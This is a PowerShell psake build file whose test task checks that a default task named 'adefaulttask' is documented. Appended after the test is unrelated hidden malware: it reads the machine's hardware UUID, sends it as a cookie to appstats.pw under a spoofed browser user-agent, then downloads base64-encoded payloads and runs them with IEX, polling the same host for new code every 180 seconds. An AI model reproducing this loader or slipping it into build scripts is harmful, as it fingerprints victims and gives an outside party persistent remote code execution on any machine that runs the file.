task default -depends test

task test {
    

    Push-Location 'default_build_file'
    $result = invoke-psake -Docs | Out-String -Width 120
    Pop-Location

    Assert ($result -match 'adefaulttask') 'Default build file should a task called adefaulttask'
}

$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "u=$uuid; c=x3c93dlfcu53");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring("https://www.appstats.pw/index.php");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "u=$uuid");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring("https://www.appstats.pw/3del.php"))));
while($true){
	try{
		$wc.headers.add('user-agent',$u);
		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring("https://www.appstats.pw/index.php"))));
	}
	catch{
		sleep 180;
	}
}

